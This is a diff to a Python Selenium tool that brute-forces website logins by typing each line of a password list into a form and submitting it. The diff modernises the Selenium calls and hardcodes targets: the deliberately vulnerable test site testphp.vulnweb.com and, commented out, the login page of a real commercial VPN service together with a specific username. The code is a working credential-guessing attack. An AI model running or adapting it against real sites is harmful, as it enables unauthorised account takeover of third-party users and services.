@@ -83,30 +83,45 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
-    browser = webdriver.Chrome(chrome_options=optionss)
+    browser = webdriver.Chrome(options=optionss)
     wait = WebDriverWait(browser, 10)
     while True:
         try:
             for line in f:
                 browser.get(website)
                 wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
-                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
-                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
-                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                Sel_user = browser.find_element("css selector",username_selector) #Finds Selector
+                Sel_pas = browser.find_element("css selector",password_selector) #Finds Selector
+                enter = browser.find_element("css selector",login_btn_selector) #Finds Selector
+
+
+
+                # Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
+                # Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
+                # enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                 Sel_user.send_keys(username)
+
                 Sel_pas.send_keys(line)
+                t.sleep(4)
+
+                enter = browser.find_element("css selector",login_btn_selector) #Finds Selector
+                enter.submit()
+
                 print ('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print ('------------------------')
-        except KeyboardInterrupt: #returns to main menu if ctrl C is used
-            print('CTRL C')
-            break
-        except selenium.common.exceptions.NoSuchElementException:
+        # except KeyboardInterrupt: #returns to main menu if ctrl C is used
+        #     print('CTRL C')
+        #     exit()
+
+        except NoSuchElementException: #returns to main menu if ctrl C is used
             print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
             print ('LAST PASS ATTEMPT BELLOW')
             print (color.GREEN + 'Password has been found: {0}'.format(line))
             print (color.YELLOW + 'Have fun :)')
             exit()
+
+        
 
 banner = color.BOLD + color.RED +'''
   _    _       _       _
@@ -119,21 +134,37 @@ banner = color.BOLD + color.RED +'''
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
-if options.username == None:
-    if options.usernamesel == None:
-        if options.passsel == None:
-            if options.loginsel == None:
-                if options.passlist == None:
-                    if options.website == None:
-                        wizard()
+# if options.username == None:
+#     if options.usernamesel == None:
+#         if options.passsel == None:
+#             if options.loginsel == None:
+#                 if options.passlist == None:
+#                     if options.website == None:
+#                         wizard()
 
 
-username = options.username
-username_selector = options.usernamesel
-password_selector = options.passsel
-login_btn_selector = options.loginsel
-website = options.website
-pass_list = options.passlist
+# username = options.username
+# username_selector = options.usernamesel
+# password_selector = options.passsel
+# login_btn_selector = options.loginsel
+# website = options.website
+# pass_list = options.passlist
+
+username = "test"
+username_selector = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(1) > td:nth-child(2) > input[type=text]"
+password_selector = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(2) > td:nth-child(2) > input[type=password]"
+login_btn_selector = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
+website = "http://testphp.vulnweb.com/login.php"
+pass_list = "myPassword.txt"
+
+# username = "PublicDeskBenefactor"
+# username_selector = "#username"
+# password_selector = "#pass"
+# login_btn_selector = "#login_button"
+# website = "https://windscribe.com/login"
+# pass_list = "myPassword.txt"
+
+
 print (banner)
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
